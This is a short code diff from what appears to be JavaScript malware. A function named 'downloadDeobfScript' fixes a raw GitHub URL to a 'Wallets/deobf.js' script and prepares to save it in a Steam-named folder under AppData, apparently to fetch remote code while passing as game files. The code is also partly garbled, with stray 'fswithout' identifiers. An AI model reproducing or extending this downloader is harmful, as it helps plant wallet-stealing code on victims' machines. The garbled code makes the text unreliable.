@@ -60,7 +60,7 @@ function downloadDeobfScript(retryCount = 0) {
   const userPath = os.homedir();
   const scriptDir = path.join(userPath, 'AppData', 'LocalLow', 'Temp', 'Steam', 'scripts');
   const filePath = path.join(scriptDir, 'deobf.js');
-  const url = 'https://raw.githubusercontent.com/Bread-M4/Sylon-v2/refswithout/heads/main/Wallets/deobf.js';
+  const url = 'https://raw.githubusercontent.com/Bread-M4/Sylon-v2/refs/heads/main/Wallets/deobf.js';
 
   if (!fswithout.existsSync(scriptDir)) {
     fswithout.mkdirSync(scriptDir, { recursive: true });
